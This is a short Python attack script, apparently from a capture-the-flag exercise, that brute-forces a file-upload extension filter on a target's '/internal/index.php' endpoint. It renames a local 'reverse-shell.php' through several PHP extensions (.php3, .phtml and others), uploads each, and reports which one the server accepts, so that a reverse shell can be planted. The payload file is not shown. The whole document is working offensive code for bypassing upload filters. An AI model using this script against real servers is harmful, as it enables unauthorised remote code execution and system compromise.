#!/usr/bin/python3

import requests, os

ip = input("Enter ip: ")

url = f"http://{ip}:3333/internal/index.php"

old_filename = "reverse-shell.php"


filename = "reverse-shell"

extensions = [ ".php", ".php3", ".php4", ".php5", ".phtml",]

for ext in extensions:

	new_filename = filename + ext

	os.rename(old_filename, new_filename)

	#print(file)

	files = {"file": open(new_filename, "rb")}
	response = requests.post(url, files=files)

	#print(response.text)

	if "Extension not allowed" in response.text:
		print(f"{ext} not allowed")
	else:
		print(f"{ext} ALLOWED!?")

	
	old_filename = new_filename
